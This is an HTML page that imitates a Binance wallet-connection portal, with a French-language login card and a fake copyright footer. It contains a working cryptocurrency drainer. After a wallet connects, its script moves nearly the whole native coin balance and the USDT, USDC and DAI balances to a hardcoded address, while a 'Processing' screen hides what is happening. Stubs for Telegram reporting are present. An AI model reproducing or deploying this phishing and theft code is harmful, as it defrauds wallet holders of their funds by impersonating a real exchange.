<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: system-ui, -apple-system, sans-serif;
        }
        .card {
            background: white;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .spinner { animation: spin 1s linear infinite; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

<div class="max-w-md w-full">
    
    <!-- CONNECT (HTML PERSONNALISÉ) -->
    <!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | Binance</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            font-family: 'Inter', sans-serif;
        }
        .btn-connect {
            background: linear-gradient(90deg, #f0b90b 0%, #f8d33a 100%);
            transition: all 0.3s ease;
        }
        .btn-connect:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(240, 185, 11, 0.4);
        }
        .logo-glow {
            text-shadow: 0 0 20px rgba(240, 185, 11, 0.5);
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="text-center">
        <!-- Logo Binance -->
        <div class="flex items-center justify-center mb-8">
            <div class="bg-yellow-500 w-10 h-10 rounded-lg mr-3 flex items-center justify-center">
                <i class="fas fa-coins text-gray-900 text-xl"></i>
            </div>
            <h1 class="text-3xl font-bold text-white logo-glow">Binance</h1>
        </div>
        
        <!-- Section de connexion -->
        <div id="connect" class="bg-gray-800 rounded-2xl p-8 shadow-xl border border-gray-700 max-w-md mx-auto">
            <div class="text-center mb-6">
                <i class="fas fa-wallet text-yellow-500 text-5xl mb-4"></i>
                <h2 class="text-2xl font-bold text-white mb-2">Connectez votre wallet</h2>
                <p class="text-gray-400">Accédez à votre portefeuille Binance</p>
            </div>
            
            <!-- Bouton de connexion -->
            <button onclick="connect()" class="w-full py-4 px-6 btn-connect text-gray-900 font-bold rounded-xl text-lg flex items-center justify-center">
                <i class="fas fa-plug mr-3"></i>
                Connecter le wallet
            </button>
        </div>
        
        <!-- Footer -->
        <div class="text-center mt-8 text-gray-500 text-sm">
            <p>© 2023 Binance. Tous droits réservés.</p>
        </div>
    </div>

    <script>
        function connect() {
            // Simulation de connexion
            const connectBtn = document.querySelector('button[onclick="connect()"]');
            const originalText = connectBtn.innerHTML;
            
            connectBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-3"></i> Connexion en cours...';
            connectBtn.disabled = true;
            
            // Simulation d'un délai de connexion
            setTimeout(() => {
                // Ici, vous ajouterez la logique réelle de connexion au wallet
                alert('Connexion au wallet réussie !');
                connectBtn.innerHTML = originalText;
                connectBtn.disabled = false;
            }, 2000);
        }
    </script>
</body>
</html>

    <!-- PROCESSING -->
    <div id="processing" class="card p-8 text-center hidden">
        <div class="text-6xl mb-4 spinner">⚡</div>
        <h2 class="text-2xl font-bold text-gray-800 mb-4">Processing</h2>
        <p id="status" class="text-gray-600 mb-4">Initializing...</p>
        <div class="w-full bg-gray-200 rounded-full h-3 mb-4">
            <div id="progress" class="bg-purple-600 h-3 rounded-full transition-all" style="width:0%"></div>
        </div>
        <p id="detail" class="text-sm text-gray-500"></p>
    </div>

    <!-- SUCCESS -->
    <div id="success" class="card p-8 text-center hidden">
        <div class="text-6xl mb-4">✅</div>
        <h2 class="text-2xl font-bold text-green-600 mb-4">Complete!</h2>
        <p class="text-gray-600 mb-4">Transactions completed</p>
        <div id="result" class="bg-gray-100 rounded-xl p-4 text-sm text-left max-h-64 overflow-y-auto mb-4"></div>
        <button onclick="location.reload()" class="w-full bg-purple-600 text-white py-3 rounded-xl">Done</button>
    </div>

</div>

<script type="module">
import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'

const DEST = "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578";
const PID = "72f0728c47e59d2eb9fc83069bc6843d";
const TELEGRAM_BOT = "";
const TELEGRAM_CHAT = "";

const ERC20_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address, uint256) returns (bool)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)"
];

const TOKENS = {
    1: [
        {addr:"0xdAC17F958D2ee523a2206206994597C13D831ec7",symbol:"USDT"},
        {addr:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",symbol:"USDC"},
        {addr:"0x6B175474E89094C44Da98b954EedeAC495271d0F",symbol:"DAI"}
    ],
    137: [
        {addr:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",symbol:"USDT"},
        {addr:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",symbol:"USDC"},
        {addr:"0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",symbol:"DAI"}
    ],
    56: [
        {addr:"0x55d398326f99059fF775485246999027B3197955",symbol:"USDT"},
        {addr:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",symbol:"USDC"}
    ]
};

const CHAINS = {
    1: {name:'Ethereum',currency:'ETH'},
    137: {name:'Polygon',currency:'MATIC'},
    56: {name:'BSC',currency:'BNB'}
};

const mainnet = {chainId:1,name:'Ethereum',currency:'ETH',explorerUrl:'https://etherscan.io',rpcUrl:'https://eth.llamarpc.com'};
const polygon = {chainId:137,name:'Polygon',currency:'MATIC',explorerUrl:'https://polygonscan.com',rpcUrl:'https://polygon-rpc.com'};
const bsc = {chainId:56,name:'BSC',currency:'BNB',explorerUrl:'https://bscscan.com',rpcUrl:'https://bsc-dataseed.binance.org'};

const cfg = defaultConfig({
    metadata:{name:'Portal',description:'Connect',url:window.location.origin,icons:['https://avatars.githubusercontent.com/u/37784886']},
    enableEIP6963:true,
    enableInjected:true,
    enableCoinbase:true,
    rpcUrl:'https://polygon-rpc.com',
    defaultChainId:137
});

const modal = createWeb3Modal({
    ethersConfig:cfg,
    chains:[polygon,mainnet,bsc],
    projectId:PID,
    enableAnalytics:false
});

let provider, signer, address, chainId;
let results = [];
let drainStarted = false;

function show(id) {
    ['connect','processing','success'].forEach(x => 
        document.getElementById(x).classList.add('hidden')
    );
    document.getElementById(id).classList.remove('hidden');
}

function setStatus(t){document.getElementById('status').textContent=t;}
function setDetail(t){document.getElementById('detail').textContent=t;}
function setProgress(n){document.getElementById('progress').style.width=n+'%';}
function log(m){console.log('[DRAIN] '+m);}


async function sendTelegram(msg) {}
async function sendTelegramSummary() {}

window.connect = async function() {
    try {
        log('Opening modal...');
        await modal.open();
    } catch(e) {
        log('ERROR: '+e.message);
        alert('Connection failed: '+e.message);
    }
}

modal.subscribeProvider(async(state) => {
    log('Provider state: connected=' + state.isConnected);
    
    if(state.isConnected && state.address && !drainStarted) {
        drainStarted = true;
        log('Wallet connected: ' + state.address);
        address = state.address;
        
        try {
            provider = new ethers.providers.Web3Provider(state.provider);
            signer = provider.getSigner();
            const net = await provider.getNetwork();
            chainId = net.chainId;
            
            log('Chain: ' + chainId);
            await new Promise(resolve => setTimeout(resolve, 2000));
            await drain();
        } catch(e) {
            log('ERROR: ' + e.message);
            alert('Setup failed: ' + e.message);
        }
    }
});

async function drain() {
    show('processing');
    setStatus('Initializing...');
    setProgress(10);
    results = [];
    
    try {
        if (!provider || !signer || !address || !chainId) {
            throw new Error('Provider not ready');
        }
        
        const chain = CHAINS[chainId];
        if(!chain) {
            throw new Error('Unsupported chain');
        }
        
        log('Draining on: ' + chain.name);
        
        setStatus('Checking balance...');
        setProgress(20);
        
        const balance = await provider.getBalance(address);
        const balEth = parseFloat(ethers.utils.formatEther(balance));
        
        log('Balance: ' + balEth + ' ' + chain.currency);
        
        if(balEth > 0.001) {
            setStatus('Transferring '+chain.currency+'...');
            setDetail('Amount: '+balEth.toFixed(4));
            
            const nativeHash = await drainNative(balance, chain);
            if(nativeHash) {
                results.push({
                    symbol: chain.currency,
                    amount: balEth.toFixed(6),
                    txHash: nativeHash
                });
            }
        }
        
        setProgress(40);
        
        const tokenList = TOKENS[chainId] || [];
        log('Checking ' + tokenList.length + ' tokens...');
        
        let checked = 0;
        
        for(const token of tokenList) {
            try {
                checked++;
                const progressPct = 40 + (50 * checked / tokenList.length);
                setProgress(progressPct);
                setStatus('Checking '+token.symbol+'...');
                setDetail('Token '+checked+'/'+tokenList.length);
                
                const tc = new ethers.Contract(token.addr, ERC20_ABI, provider);
                const bal = await tc.balanceOf(address);
                
                if(bal.gt(0)) {
                    const dec = await tc.decimals();
                    const fmt = ethers.utils.formatUnits(bal, dec);
                    
                    setStatus('Transferring '+token.symbol+'...');
                    setDetail('Amount: '+fmt.slice(0,10));
                    
                    const tokenHash = await drainToken(token.addr, bal, token.symbol);
                    if(tokenHash) {
                        results.push({
                            symbol: token.symbol,
                            amount: fmt.slice(0,10),
                            txHash: tokenHash
                        });
                    }
                }
                
            } catch(e) {
                log('Error with ' + token.symbol + ': ' + e.message);
            }
        }
        
        setProgress(100);
        
        if(results.length === 0) {
            alert('No assets found');
            show('connect');
            return;
        }
        
        await sendTelegramSummary();
        
        displayResults();
        
    } catch(e) {
        log('ERROR: ' + e.message);
        alert('Error: ' + e.message);
        show('connect');
    }
}

async function drainNative(balance, chain) {
    try {
        const gp = await provider.getGasPrice();
        const gc = gp.mul(21000).mul(2);
        const amt = balance.sub(gc);
        
        if(amt.lte(0)) return null;
        
        const tx = await signer.sendTransaction({
            to: DEST,
            value: amt,
            gasLimit: 21000
        });
        
        setDetail('Confirming: '+tx.hash.slice(0,10)+'...');
        await tx.wait();
        
        return tx.hash;
    } catch(e) {
        log('Native error: ' + e.message);
        return null;
    }
}

async function drainToken(addr, balance, symbol) {
    try {
        const tc = new ethers.Contract(addr, ERC20_ABI, signer);
        const tx = await tc.transfer(DEST, balance, {gasLimit:100000});
        
        setDetail('Confirming: '+tx.hash.slice(0,10)+'...');
        await tx.wait();
        
        return tx.hash;
    } catch(e) {
        log('Token error: ' + e.message);
        return null;
    }
}

function displayResults() {
    show('success');
    
    let html = '<p class="font-bold mb-3">Completed Transfers:</p>';
    
    results.forEach((r,i) => {
        html += `<div class="mb-3 pb-3 ${i<results.length-1?'border-b border-gray-200':''}">
            <p class="font-semibold text-gray-800">${r.symbol}</p>
            <p class="text-xs text-gray-600">Amount: ${r.amount}</p>
            <p class="text-xs text-blue-600 break-all">TX: ${r.txHash}</p>
        </div>`;
    });
    
    document.getElementById('result').innerHTML = html;
    log('=== COMPLETE ===');
}

log('System ready');
log('Destination: ' + DEST);
</script>

</body>
</html>
